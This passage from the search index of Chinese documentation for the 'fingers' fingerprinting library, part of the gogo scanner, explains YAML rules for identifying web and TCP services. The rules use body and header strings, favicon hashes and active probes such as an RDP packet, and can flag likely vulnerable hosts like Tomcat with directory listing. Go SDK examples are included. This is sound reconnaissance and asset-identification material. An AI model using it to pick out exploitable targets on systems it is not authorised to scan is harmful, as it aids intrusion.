vuln\u53ea\u652f\u6301\u6b63\u5219,  \u540c\u65f6\u652f\u6301\u7248\u672c\u53f7\u5339\u914d, \u4f7f\u7528\u62ec\u53f7\u7684\u6b63\u5219\u5206\u7ec4. \u53ea\u652f\u6301\u7b2c\u4e00\u7ec4\n        regexp: # \u5339\u914d\u6307\u7eb9\u6b63\u5219\n          - \"finger.*test\" \n       # \u9664\u4e86\u6b63\u5219, \u8fd8\u652f\u6301\u5176\u4ed6\u7c7b\u578b\u7684\u5339\u914d, \u5305\u62ec\u4ee5\u4e0b\u65b9\u5f0f\n        header: # \u4ec5http\u534f\u8bae\u53ef\u7528, \u5339\u914dheader\u4e2d\u5305\u542b\u7684\u6570\u636e\n          - string\n        body: # \u5305\u542b\u5339\u914d, \u975e\u6b63\u5219\u8868\u8fbe\u5f0f\n          - string\n        md5: # \u5339\u914dbody\u7684md5hash\n          - [md5]\n        mmh3: # \u5339\u914dbody\u7684mmh3hash\n          - [mmh3]\n\n        # \u53ea\u6709\u4e0a\u9762\u89c4\u5219\u4e2d\u7684\u81f3\u5c11\u4e00\u6761\u547d\u4e2d\u624d\u4f1a\u6267\u884cversion\n        version: \n          - version:(.*)  # \u67d0\u4e9b\u60c5\u51b5\u4e0b\u96be\u4ee5\u540c\u65f6\u7f16\u5199\u6307\u7eb9\u7684\u6b63\u5219\u4e0e\u5173\u4e8e\u7248\u672c\u7684\u6b63\u5219, \u53ef\u4ee5\u7279\u5730\u4e3aversion\u5199\u4e00\u6761\u6b63\u5219\n\n     favicon: # favicon\u7684hash\u503c, \u4ec5http\u751f\u6548\n        md5:\n          - f7e3d97f404e71d302b3239eef48d5f2\n        mmh3:\n          - '516963061'\n     level: 1      # 0\u4ee3\u8868\u4e0d\u9700\u8981\u4e3b\u52a8\u53d1\u5305, 1\u4ee3\u8868\u9700\u8981\u989d\u5916\u4e3b\u52a8\u53d1\u8d77\u8bf7\u6c42. \u5982\u679c\u5f53\u524dlevel\u4e3a0\u5219\u4e0d\u4f1a\u53d1\u9001\u6570\u636e, \u4f46\u662f\u4f9d\u65e7\u4f1a\u8fdb\u884c\u88ab\u52a8\u7684\u6307\u7eb9\u5339\u914d.\n     send_data: \"info\\n\" # \u5339\u914d\u6307\u7eb9\u9700\u8981\u4e3b\u52a8\u53d1\u9001\u7684\u6570\u636e\n     vuln: frame_unauthorized # \u5982\u679cregexps\u4e2d\u7684vuln\u547d\u4e2d, \u5219\u4f1a\u8f93\u51fa\u6f0f\u6d1e\u540d\u79f0. \u67d0\u4e9b\u6f0f\u6d1e\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5339\u914d\u5173\u952e\u5b57\u8bc6\u522b, \u56e0\u6b64\u4e00\u4e9b\u7b80\u5355\u7684poc\u4f7f\u7528\u6307\u7eb9\u7684\u65b9\u5f0f\u5b9e\u73b0, \u590d\u6742\u7684poc\u8bf7\u4f7f\u7528-e\u4e0b\u7684nuclei yaml\u914d\u7f6e\n</code></pre> <p>\u4e3a\u4e86\u538b\u7f29\u4f53\u79ef, \u6ca1\u6709\u7279\u522b\u6307\u5b9a\u7684\u53c2\u6570\u53ef\u4ee5\u7559\u7a7a\u4f1a\u4f7f\u7528\u9ed8\u8ba4\u503c\u3002</p> <p>\u5728\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b\u5927\u91cf\u6848\u4f8b\u53ef\u4f9b\u53c2\u8003\u3002</p> <p>\u4f46\u5b9e\u9645\u4e0a\u5927\u90e8\u5206\u5b57\u6bb5\u90fd\u4e0d\u9700\u8981\u914d\u7f6e, \u4ec5\u4f5c\u4e3a\u7279\u6b8a\u60c5\u51b5\u4e0b\u7684\u80fd\u529b\u50a8\u5907\u3002</p> <p>\u6bcf\u4e2a\u6307\u7eb9\u90fd\u53ef\u4ee5\u6709\u591a\u4e2arule, \u6bcf\u4e2arule\u4e2d\u90fd\u6709\u4e00\u4e2aregexps, \u6bcf\u4e2aregexps\u6709\u591a\u6761\u4e0d\u540c\u79cd\u7c7b\u7684\u5b57\u7b26\u4e32/\u6b63\u5219/hash</p>"},{"location":"libs/fingers/rule/#\u914d\u7f6e\u6848\u4f8b","title":"\u914d\u7f6e\u6848\u4f8b","text":""},{"location":"libs/fingers/rule/#\u6700\u7b80\u4f7f\u7528","title":"\u6700\u7b80\u4f7f\u7528","text":"<p>\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u53ea\u9700\u8981\u5339\u914dbody\u4e2d\u7684\u5185\u5bb9\u3002\u4e00\u4e2a\u6307\u7eb9\u63d2\u4ef6\u6700\u7b80\u914d\u7f6e\u53ef\u4ee5\u7b80\u5316\u4e3a\u5982\u4e0b\u6240\u793a:</p> <pre><code>- name: tomcat\n  rule:\n    - regexps:\n        body:\n          - Apache Tomcat\n</code></pre> <p>\u8fd9\u91cc\u7684body\u4e3a\u7b80\u5355\u7684strings.Contains\u51fd\u6570, \u5224\u65adhttp\u7684body\u4e2d\u662f\u5426\u5b58\u5728\u67d0\u4e2a\u5b57\u7b26\u4e32\u3002</p> <p>gogo\u4e2d\u6240\u6709\u7684\u6307\u7eb9\u5339\u914d\u90fd\u4f1a\u5ffd\u7565\u5927\u5c0f\u5199\u3002</p>"},{"location":"libs/fingers/rule/#\u5339\u914d\u7248\u672c\u53f7","title":"\u5339\u914d\u7248\u672c\u53f7","text":"<p>\u800c\u5982\u679c\u8981\u63d0\u53d6\u7248\u672c\u53f7, \u914d\u7f6e\u4e5f\u4e0d\u4f1a\u590d\u6742\u591a\u5c11\u3002</p> <pre><code>- name: tomcat\n  rule:\n    - regexps:\n        regexp:\n          - &lt;h3&gt;Apache Tomcat/(.*)&lt;/h3&gt;\n          - &lt;title&gt;Apache Tomcat/(.*)&lt;/title&gt;\n</code></pre>"},{"location":"libs/fingers/rule/#\u901a\u8fc7version\u5b57\u6bb5\u6620\u5c04\u7248\u672c\u53f7","title":"\u901a\u8fc7version\u5b57\u6bb5\u6620\u5c04\u7248\u672c\u53f7","text":"<p>\u4f46\u662f\u6709\u4e9b\u60c5\u51b5\u4e0b, \u7248\u672c\u53f7\u524d\u540e\u5e76\u6ca1\u6709\u53ef\u4ee5\u7528\u6765\u5339\u914d\u7684\u5173\u952e\u5b57. \u53ef\u4ee5\u91c7\u7528version\u5b57\u6bb5\u53bb\u6307\u5b9a\u7248\u672c\u53f7\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>- name: tomcat\n  rule:\n    - version: v8\n      regexps:\n        body:\n          - &lt;h3&gt;Apache Tomcat/8&lt;/h3&gt;\n</code></pre> <p>\u8fd9\u6837\u4e00\u6765\u53ea\u9700\u8981\u5339\u914d\u5230\u7279\u5b9a\u7684body, \u5728\u7ed3\u679c\u4e2d\u4e5f\u4f1a\u51fa\u73b0\u7248\u672c\u53f7\u3002</p> <p><code>[+] https://1.1.1.1:443    tomcat:v8 [200] Apache Tomcat/8.5.56</code></p>"},{"location":"libs/fingers/rule/#\u901a\u8fc7version\u89c4\u5219\u5339\u914d\u7248\u672c\u53f7","title":"\u901a\u8fc7version\u89c4\u5219\u5339\u914d\u7248\u672c\u53f7","text":"<p>\u800c\u4e00\u4e9b\u66f4\u4e3a\u7279\u6b8a\u7684\u60c5\u51b5, \u7248\u672c\u53f7\u4e0e\u6307\u7eb9\u4e0d\u5728\u540c\u4e00\u5904\u51fa\u73b0, \u4e14\u7248\u672c\u53f7\u8f83\u591a, \u8fd9\u6837\u4e3a\u4e00\u4e2a\u6307\u7eb9\u5199\u5341\u51e0\u6761\u89c4\u5219\u662f\u5f88\u9ebb\u70e6\u7684\u4e8b\u60c5, gogo\u4e5f\u63d0\u4f9b\u4e86\u4fbf\u6377\u7684\u65b9\u6cd5.</p> <p>\u770b\u4e0b\u9762\u4f8b\u5b50:</p> <pre><code>- name: tomcat\n  rule:\n    - regexps:\n        regexp:\n          - &lt;h3&gt;Apache Tomcat/8&lt;/h3&gt;\n        version:\n          - Tomcat/(.*)&lt;/h3&gt;\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7regexps\u4e2d\u7684version\u89c4\u5219\u53bb\u5339\u914d\u7cbe\u786e\u7684\u7248\u672c\u53f7\u3002version\u6b63\u5219\u5c06\u4f1a\u5728\u5176\u4ed6\u5339\u914d\u751f\u6548\u540e\u8d77\u4f5c\u7528, \u5982\u679c\u5176\u4ed6\u89c4\u5219\u547d\u4e2d\u4e86\u6307\u7eb9\u4e14\u6ca1\u53d1\u73b0\u7248\u672c\u53f7\u65f6, \u5c31\u4f1a\u4f7f\u7528version\u6b63\u5219\u53bb\u63d0\u53d6\u3002</p> <p>\u8fd9\u4e9b\u63d0\u53d6\u7248\u672c\u53f7\u7684\u65b9\u5f0f\u53ef\u4ee5\u6309\u9700\u4f7f\u7528, \u5927\u591a\u6570\u60c5\u51b5\u4e0b\u524d\u9762\u4e24\u79cd\u5373\u53ef\u89e3\u51b399%\u7684\u95ee\u9898, \u7b2c\u4e09\u79cd\u4ee5\u5907\u4e0d\u65f6\u4e4b\u9700\u3002</p>"},{"location":"libs/fingers/rule/#\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b","title":"\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b","text":"<p>\u5047\u8bbe\u60c5\u51b5\u518d\u7279\u6b8a\u4e00\u70b9, \u4f8b\u5982, \u9700\u8981\u901a\u8fc7\u4e3b\u52a8\u53d1\u5305\u547d\u4e2d\u67d0\u4e2a\u8def\u7531, \u4e14\u5339\u914d\u5230\u67d0\u4e9b\u7ed3\u679c\u3002\u4e00\u4e2a\u5f88\u7ecf\u5178\u7684\u4f8b\u5b50\u5c31\u662fnacos, \u76f4\u63a5\u8bbf\u95ee\u662f\u50cftomcat 404\u9875\u9762, \u4e14header\u4e2d\u65e0\u660e\u663e\u7279\u5f81, \u9700\u8981\u5e26\u4e0a/nacos\u8def\u5f84\u53bb\u8bbf\u95ee\u624d\u80fd\u83b7\u53d6\u5bf9\u5e94\u7684\u6307\u7eb9\u3002</p> <p>\u770bgogo\u4e2dnacos\u6307\u7eb9\u7684\u914d\u7f6e</p> <pre><code>- name: nacos\n  focus: true\n  rule:\n    - regexps:\n        body:\n          - console-ui/public/img/favicon.ico\n      send_data: /nacos\n</code></pre> <p>\u5176\u4e2d, send_data\u4e3a\u4e3b\u52a8\u53d1\u5305\u53d1\u9001\u7684URL, \u5728tcp\u6307\u7eb9\u4e2d\u5219\u4e3asocket\u53d1\u9001\u7684\u6570\u636e\u3002</p> <p>\u5f53<code>http://127.0.0.1/nacos</code>\u4e2d\u5b58\u5728<code>console-ui/public/img/favicon.ico</code>\u5b57\u7b26\u4e32, \u5219\u5224\u65ad\u4e3a\u547d\u4e2d\u6307\u7eb9\u3002</p> <p>\u8fd9\u4e2asend_data\u53ef\u4ee5\u5728\u6bcf\u4e2arule\u4e2d\u914d\u7f6e\u4e00\u4e2a, \u5047\u8bbe\u67d0\u4e2a\u6846\u67b6\u4e0d\u540c\u7248\u672c\u9700\u8981\u4e3b\u52a8\u53d1\u5305\u7684URL\u4e0d\u540c, \u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u63d2\u4ef6\u89e3\u51b3\u3002</p> <p>\u8fd9\u91cc\u8fd8\u770b\u5230\u4e86focus\u5b57\u6bb5, \u8fd9\u4e2a\u5b57\u6bb5\u662f\u7528\u6765\u6807\u8bb0\u4e00\u4e9b\u91cd\u70b9\u6307\u7eb9, \u9ed8\u8ba4\u6dfb\u52a0\u4e86\u4e00\u4e0b\u5b58\u5728\u5e38\u89c1\u6f0f\u6d1e\u7684\u6307\u7eb9, \u4e5f\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u76840day\u5e93\u81ea\u884c\u914d\u7f6e\u3002\u5728\u8f93\u51fa\u65f6\u4e5f\u4f1a\u5e26\u6709focus\u5b57\u6837, \u53ef\u4ee5\u901a\u8fc7<code>--filter focus</code> \u8fc7\u6ee4\u51fa\u6240\u6709\u91cd\u8981\u6307\u7eb9\u3002</p>"},{"location":"libs/fingers/rule/#\u6f0f\u6d1e\u4fe1\u606f\u5339\u914d","title":"\u6f0f\u6d1e\u4fe1\u606f\u5339\u914d","text":"<p>\u800c\u8fd8\u6709\u60c5\u51b5\u4e0b, \u67d0\u4e9b\u6f0f\u6d1e\u6216\u4fe1\u606f\u4f1a\u76f4\u63a5\u7684\u4ee5\u88ab\u52a8\u7684\u5f62\u5f0f\u88ab\u53d1\u73b0, \u4e0d\u9700\u8981\u989d\u5916\u53d1\u5305\u3002\u6240\u4ee5\u8fd8\u6dfb\u52a0\u4e86\u4e00\u4e2a\u6f0f\u6d1e\u6307\u7eb9\u7684\u529f\u80fd\u3002</p> <p>\u4f8b\u5982gogo\u4e2d\u771f\u5b9e\u914d\u7f6e\u7684tomcat\u6307\u7eb9\u4e3a\u4f8b\uff1a</p> <pre><code>- name: tomcat\n  rule:\n    - regexps:\n        vuln:\n          - Directory Listing For\n        regexp:\n          - &lt;h3&gt;Apache Tomcat/(.*)&lt;/h3&gt;\n          - &lt;title&gt;Apache Tomcat/(.*)&lt;/title&gt;\n        header:\n          - Apache-Coyote\n      favicon:\n        md5:\n          - 4644f2d45601037b8423d45e13194c93\n      info: tomcat Directory traversal\n      # vuln: this is vuln title\n</code></pre> <p>regexps\u4e2d\u914d\u7f6e\u4e86vuln\u5b57\u6bb5, \u8fd9\u4e2a\u5b57\u5178\u5982\u679c\u547d\u4e2d, \u5219\u540c\u65f6\u7ed9\u76ee\u6807\u6dfb\u52a0\u4e0avuln\u8f93\u51fa, \u4e5f\u5c31\u662f\u4f7f\u7528gogo\u7ecf\u5e38\u770b\u5230\u7684\u8f93\u51fa\u7684\u672b\u5c3e\u4f1a\u6dfb\u52a0<code>[ info: tomcat Directory traversa]</code> </p> <p>\u8fd9\u91cc\u4e5f\u6709\u4e24\u79cd\u9009\u62e9info/vuln, info\u4e3a\u4fe1\u606f\u6cc4\u9732\u3001vuln\u4e3a\u6f0f\u6d1e\u3002\u5f53\u586b\u5199\u7684\u662fvuln, \u5219\u8f93\u51fa\u4f1a\u6539\u6210<code>[ high: tomcat Directory traversa]</code> </p> <p>\u8fd9\u91cc\u8fd8\u6709\u4e2afavicon\u7684\u914d\u7f6e, favicon\u652f\u6301mmh3\u6216md5, \u53ef\u4ee5\u914d\u7f6e\u591a\u6761\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f<code>favicon</code>\u4e0e<code>send_data</code>\u5b57\u6bb5\u90fd\u53ea\u7528\u5728\u547d\u4ee4\u884c\u5f00\u542f\u4e86<code>-v</code>(\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b)\u6a21\u5f0f\u4e0b\u624d\u4f1a\u751f\u6548\u3002\u6bcf\u4e2a\u6307\u7eb9\u53ea\u8981\u547d\u4e2d\u4e86\u4e00\u6761\u89c4\u5219\u5c31\u4f1a\u9000\u51fa, \u4e0d\u4f1a\u505a\u91cd\u590d\u65e0\u6548\u5339\u914d\u3002</p>"},{"location":"libs/fingers/rule/#service\u6307\u7eb9","title":"Service\u6307\u7eb9","text":"<p>\u4e0a\u9762\u7684\u6307\u7eb9\u90fd\u6ca1\u6709\u586b\u5199protocol , \u6240\u4ee5\u9ed8\u8ba4\u662fhttp\u6307\u7eb9. fingers\u8fd8\u652f\u6301service\u6307\u7eb9, \u89c4\u5219\u4e0ehttp\u6307\u7eb9\u5b8c\u5168\u4e00\u81f4. \u53ea\u9700\u8981\u5c06protocol\u8bbe\u7f6e\u4e3atcp/udp\u5373\u53ef.</p> <p>\u4ee5\u8fd9\u4e2ardp\u670d\u52a1\u4e3a\u4f8b\u5b66\u4e60\u5982\u4f55\u7f16\u5199\u4e00\u4e2atcp\u6307\u7eb9.</p> <pre><code>- name: rdp\n  default_port:\n    - rdp\n  protocol: tcp\n  rule:\n    - regexps:\n        regexp:\n          - \"^\\x03\\0\\0\"\n      send_data: b64de|AwAAKiXgAAAAAABDb29raWU6IG1zdHNoYXNoPW5tYXANCgEACAADAAAA\n</code></pre> <p>\u6307\u7eb9\u7684<code>default_port</code>\u53ef\u4ee5\u4f7f\u7528port.yaml\u4e2d\u7684\u914d\u7f6e.</p> <p>port.yaml\u4e2d\u7684rdp:</p> <pre><code>- name: rdp\n  ports:\n    - '3389'\n    - '13389'\n    - '33899'\n    - \"33389\"\n</code></pre> <p>\u53e6\u5916, rdp\u670d\u52a1\u9700\u8981\u4e3b\u52a8\u53d1\u5305\u624d\u80fd\u83b7\u53d6\u5230\u5f85\u5339\u914d\u7684\u6570\u636e, \u56e0\u6b64, \u8fd8\u9700\u8981\u914d\u7f6esend_data. </p> <p>\u800c\u4e3a\u4e86\u65b9\u4fbf\u5728yaml\u4e2d\u914d\u7f6e\u4e8c\u8fdb\u5236\u7684\u53d1\u5305\u6570\u636e, gogo\u6dfb\u52a0\u4e86\u4e00\u4e9b\u7b80\u5355\u7684\u7f16\u7801\u5668. \u5206\u522b\u4e3a:</p> <ul> <li>b64en , base64\u7f16\u7801</li> <li>b64de , base64\u89e3\u7801</li> <li>hex, hex\u7f16\u7801</li> <li>unhex, hex\u89e3\u7801</li> <li>md5, \u8ba1\u7b97md5</li> </ul> <p>\u5728\u6570\u636e\u7684\u5f00\u5934\u6dfb\u52a0<code>b64de|</code> \u5373\u53ef\u751f\u6548. \u5982\u679c\u6ca1\u6709\u6dfb\u52a0\u4efb\u4f55\u88c5\u9970\u5668, \u6570\u636e\u5c06\u4ee5\u539f\u6837\u53d1\u9001. \u9700\u8981\u6ce8\u610f\u7684\u662fyaml\u89e3\u6790\u540e\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u53ef\u80fd\u4e0d\u662f\u4f60\u770b\u5230\u7684, \u5f3a\u70c8\u5efa\u8bae\u4e8c\u8fdb\u5236\u6570\u636e\u90fd\u4f7f\u7528base64\u6216hex\u7f16\u7801\u540e\u4f7f\u7528.</p>"},{"location":"libs/fingers/sdk/","title":"SDK","text":""},{"location":"libs/fingers/sdk/#engine","title":"Engine","text":""},{"location":"libs/fingers/sdk/#\u521d\u59cb\u5316","title":"\u521d\u59cb\u5316","text":"<p>fingers \u63d0\u4f9b\u4e86\u4e00\u4e2a\u9884\u8bbe\u914d\u7f6e\u7684\u521d\u59cb\u5316API <code>NewEngine</code>, \u63d0\u4f9b\u521d\u59cb\u5316\u6240\u6709\u652f\u6301\u7684\u5f15\u64ce. </p> <pre><code>func NewEngine(engines ...string) (*Engine, error)\n</code></pre> <p>\u5982\u679cengines\u4e3a\u7a7a\u5219\u521d\u59cb\u5316\u6240\u6709\u5f15\u64ce. \u4e5f\u53ef\u4ee5\u9009\u62e9\u81ea\u5df1\u9700\u8981\u7684engine\u8fdb\u884c\u521d\u59cb\u5316.</p> <pre><code>FaviconEngine     = \"favicon\"\nFingersEngine     = \"fingers\"\nFingerPrintEngine = \"fingerprinthub\"\nWappalyzerEngine  = \"wappalyzer\"\nEHoleEngine       = \"ehole\"\nGobyEngine        = \"goby\"\n</code></pre> <pre><code>need := []string{FingersEngine, FingerPrintEngine}\nengine, err := NewEngine(need...)\nif err != nil {\n    panic(err)\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#\u6307\u7eb9\u5339\u914d","title":"\u6307\u7eb9\u5339\u914d","text":""},{"location":"libs/fingers/sdk/#detectresponse","title":"DetectResponse","text":"<p>\u901a\u8fc7http.Response\u5339\u914d</p> <p>\u8c03\u7528\u6240\u6709\u7684\u6307\u7eb9\u5f15\u64ce\u5bf9\u6307\u5b9a\u76ee\u6807\u7684\u8fd4\u56de\u7ed3\u679c\u8fdb\u884c\u5339\u914d</p> <pre><code>func TestEngine(t *testing.T) {\n    engine, err := NewEngine()\n    if err != nil {\n       panic(err)\n    }\n    resp, err := http.Get(\"http://127.0.0.1:8080/\")\n    if err != nil {\n       return\n    }\n    frames, err := engine.DetectResponse(resp)\n    if err != nil {\n       return\n    }\n    fmt.Println(frames.String())\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#detectresponse_1","title":"DetectResponse","text":"<p>\u901a\u8fc7[]bytes\u5339\u914d</p> <p>\u5982\u679c\u5df2\u7ecf\u8fdb\u884c\u8fc7\u8bfb\u53d6, \u4e5f\u53ef\u4ee5\u4f7f\u7528<code>DetectContent(content []bytes)</code>\u4ee3\u66ff<code>DetectResponse</code></p> <pre><code>func TestEngine(t *testing.T) {\n    engine, err := NewEngine()\n    if err != nil {\n       panic(err)\n    }\n    resp, err := http.Get(\"http://127.0.0.1:8080/\")\n    if err != nil {\n       return\n    }\n    content := httputils.ReadRaw(resp)\n    frames, err := engine.DetectContent(content)\n    if err != nil {\n        return\n    }\n    fmt.Println(frames.String())\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#detectfavicon","title":"DetectFavicon","text":"<p>\u56e0\u4e3afavicon\u68c0\u6d4b\u9700\u8981\u7279\u6b8a\u7684\u76ee\u5f55, \u4e0e\u5176\u4ed6\u6307\u7eb9\u5339\u914d\u4f20\u5165\u7684\u6570\u636e\u4e0d\u540c.</p> <p>\u56e0\u6b64Engine\u63d0\u4f9b\u4e86\u5355\u72ec\u7684<code>DetectFavicon</code> api</p> <p>\u8c03\u7528Favicon\u5f15\u64ce\u5bf9\u56fe\u6807\u8fdb\u884c\u5339\u914d:</p> <pre><code>func TestFavicon(t *testing.T) {\n    engine, err := NewEngine()\n    if err != nil {\n        panic(err)\n    }\n    resp, err := http.Get(\"http://baidu.com/favicon.ico\")\n    if err != nil {\n        return\n    }\n    content := httputils.ReadRaw(resp)\n    body, _, _ := httputils.SplitHttpRaw(content)\n    frame := engine.DetectFavicon(body)\n    fmt.Println(frame.String())\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#match","title":"Match","text":"<p><code>Match</code>\u662f<code>DetectResponse</code>\u548c<code>DetectContent</code>\u5b9e\u9645\u8c03\u7528\u7684\u63a5\u53e3, \u533a\u522b\u5728\u4e8e<code>DetectContent</code>\u4e0e<code>DetectResponse</code> \u63d0\u4f9b\u4e86\u4e00\u4e9b\u6027\u80fd\u4f18\u5316\u4e0e\u6821\u9a8c. </p> <p>Match\u53ea\u80fd\u63a5\u53d7<code>*http.Response</code>\u4e5f\u610f\u5473\u7740\u53ea\u63a5\u53d7\u5408\u6cd5\u7684http\u8fd4\u56de\u503c\u4f5c\u4e3a\u8f93\u5165. \u56e0\u4e3a\u90e8\u5206\u6307\u7eb9\u5f15\u64ce\u4f1a\u6709header, cookie\u76f8\u5173\u7684\u5339\u914dpart. </p> <pre><code>func TestEngine_Match(t *testing.T) {\n    engine, err := NewEngine()\n    if err != nil {\n        panic(err)\n    }\n    resp, err := http.Get(\"http://127.0.0.1:8089\")\n    if err != nil {\n        panic(err)\n    }\n    frames := engine.Match(resp)\n    fmt.Println(frames.String())\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#matchwithengines","title":"MatchWithEngines","text":"<p>\u6307\u5b9a\u5f15\u64ce\u540d\u5b57, \u8c03\u7528\u7279\u5b9a\u7684Match</p> <pre><code>func TestEngine_MatchWithEngines(t *testing.T) {\n    engine, err := NewEngine()\n    if err != nil {\n        t.Error(err)\n    }\n    resp, err := http.Get(\"http://127.0.0.1\")\n    if err != nil {\n        return\n    }\n\n    need := []string{FingersEngine, FingerPrintEngine}\n    frames := engine.MatchWithEngines(resp, need...)\n    for _, frame := range frames {\n        t.Log(frame)\n    }\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#disable","title":"Disable","text":"<p>\u5173\u95ed\u7279\u5b9a\u5f15\u64ce</p> <p><code>engine.Disable(\"ehole\")</code></p>"},{"location":"libs/fingers/sdk/#enable","title":"Enable","text":"<p>\u5f00\u542f\u5df2\u7ecf\u6ce8\u518c\u7684\u5f15\u64ce, \u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u81ea\u52a8Enable.</p> <p><code>engine.Enable(\"ehole\")</code></p>"},{"location":"libs/fingers/sdk/#\u81ea\u5b9a\u4e49\u5f15\u64ce","title":"\u81ea\u5b9a\u4e49\u5f15\u64ce","text":""},{"location":"libs/fingers/sdk/#impl","title":"Impl","text":"<p>fingers\u4e2d\u7684\u5f15\u64ce\u5fc5\u987b\u8981\u5b9e\u73b0\u8fd9\u56db\u4e2a\u63a5\u53e3\u624d\u80fd\u6ce8\u518c\u5230Engine\u4e2d <pre><code>type EngineImpl interface {\n    Name() string\n    Compile() error\n    Len() int\n    Match(content []byte) common.Frameworks\n}\n</code></pre></p>"},{"location":"libs/fingers/sdk/#\u52a8\u6001\u6ce8\u518c","title":"\u52a8\u6001\u6ce8\u518c","text":"<p>\u5b9e\u73b0\u4e86EngineImpl\u63a5\u53e3\u7684struct\u5c06\u53ef\u4ee5\u88ab\u6ce8\u518c\u5230Engine\u4e2d. \u4f8b\u5982</p> <pre><code>func RegisterCustomEngine(engine *fingers.Engine) error {\n    customEngine, err := NewCustomEngine()\n    if err != nil {\n       return err\n    }\n    engine.Register(customEngine)\n    return nil\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#\u5355\u6307\u7eb9\u5e93\u8c03\u7528","title":"\u5355\u6307\u7eb9\u5e93\u8c03\u7528","text":"<p>\u521d\u59cb\u5316\u5355\u4e2a\u6307\u7eb9\u5e93\u5e76\u8c03\u7528:</p> <pre><code>func TestFingersEngine(t *testing.T) {\n    engine, err := fingers.NewFingersEngine()\n    if err != nil {\n        t.Error(err)\n    }\n    resp, err := http.Get(\"http://127.0.0.1\")\n    if err != nil {\n        return\n    }\n\n    content := httputils.ReadRaw(resp)\n    frames := engine.Match(content)\n    for _, frame := range frames {\n        t.Log(frame)\n    }\n}\n</code></pre>"},{"location":"libs/fingers/sdk/#alias","title":"Alias","text":"<p>\u591a\u6307\u7eb9\u5e93\u53ef\u80fd\u4f1a\u51fa\u73b0\u540c\u4e00\u4e2a\u6307\u7eb9\u5728\u4e0d\u540c\u6307\u7eb9\u5e93\u4e2d\u5b58\u5728\u4e0d\u540c\u547d\u540d\u7684\u60c5\u51b5. \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u5b9e\u73b0<code>alias</code>\u8f6c\u6362, \u80fd\u8ba9\u4e0d\u540c\u6307\u7eb9\u5e93\u4e2d\u7684\u522b\u540d\u4ee5\u7edf\u4e00\u7684\u65b9\u5f0f\u5c55\u793a, \u5e76\u4e14\u56fa\u5b9aproduct\u4e0evendor, \u80fd\u8ba9\u6ca1\u6709\u5b9e\u73b0CPE\u76f8\u5173\u529f\u80fd\u7684\u6307\u7eb9\u5e93\u4e5f\u80fd\u652f\u6301CPE\u3002</p>"},{"location":"libs/fingers/sdk/#alias_1","title":"Alias","text":"<p><code>alias.yaml</code>\u5728 https://github.com/chainreactors/fingers/blob/master/alias/aliases.yaml   \u4e2d\u914d\u7f6e.</p> <p>\u5b9a\u4e49:</p> <pre><code>type Alias struct {\n    Name           string `json:\"name\" yaml:\"name\"`\n    normalizedName string\n    Vendor         string              `json:\"vendor\" yaml:\"vendor\"`\n    Product        string              `json:\"product\" yaml:\"product\"`\n    Version        string              `json:\"version,omitempty\" yaml:\"version\"`\n    Update         string              `json:\"update,omitempty\" yaml:\"update\"`\n    Edition        string              `json:\"edition,omitempty\" yaml:\"edition\"`\n    AliasMap       map[string][]string `json:\"alias\" yaml:\"alias\"`\n    Block          []string            `json:\"block,omitempty\" yaml:\"block\"`\n    blocked        map[string]bool\n}\n</code></pre> <p>\u5177\u4f53\u914d\u7f6e\u4ee5\u7528\u53cbNC\u4e3a\u4f8b.</p> <pre><code>- name: \u7528\u53cb NC      # \u5bf9\u5916\u5c55\u793a\u7684\u540d\u5b57\n  vendor: yonyou    # \u5382\u5546, \u5bf9\u5e94\u5230CPE\u7684vendor\n  product: NC       # \u4ea7\u54c1\u540d, \u5bf9\u5e94\u5230CPE\u7684product\n  alias:            # \u522b\u540d\n    fingers:        # \u6307\u7eb9\u5e93\u540d\n      - \u7528\u53cbNC       # \u5bf9\u5e94\u6307\u7eb9\u5e93\u4e2d\u7684\u540d\u5b57\n    ehole:          \n      - \u7528\u53cbNC       # \u53ef\u4ee5\u662f\u591a\u4e2a\u522b\u540d\n      - YONYOU NC\n    goby:\n      - UFIDA NC\n    fingerprinthub:\n      - yonyou-ufida-nc\n</code></pre> <p>\u9ed8\u8ba4\u5728<code>NewEngine</code>\u65f6, \u4f1a\u901a\u8fc7\u5185\u5d4c\u7684aliases.yaml \u521d\u59cb\u5316. \u5e76\u52a0\u8f7d\u539f\u751f\u6307\u7eb9\u5e93fingers\u7684\u6570\u636e\u4f5c\u4e3a\u57fa\u51c6\u503c. </p>"},{"location":"libs/fingers/sdk/#block","title":"Block","text":"<p>\u914d\u7f6e\u4e86alias\u7684\u6620\u5c04\u540e, \u53ef\u4ee5\u901a\u8fc7block\u6765\u89e3\u51b3\u4e00\u4e9b\u8bef\u62a5\u95ee\u9898. </p> <p>\u4ee5\u4e0b\u914d\u7f6e\u8868\u793a: \u5982\u679cgoby\u8bc6\u522b\u5230\u4e86<code>UFIDA NC</code>, \u5e76\u4e14\u914d\u7f6e\u4e86block goby, \u5219\u8fd9\u4e2a\u7ed3\u6784\u4e0d\u4f1a\u5408\u5e76\u5230\u6700\u7ec8\u7ed3\u679c\u4e2d. </p> <pre><code>- name: \u7528\u53cb NC     \n  vendor: yonyou    \n  product: NC       \n  block:\n    - goby # \u9700\u8981\u5c4f\u853d\u7684engine\n  alias:            \n    fingers:        \n      - \u7528\u53cbNC       \n    ehole:          \n      - \u7528\u53cbNC\n      - YONYOU NC\n    goby:\n      - UFIDA NC\n    fingerprinthub:\n      - 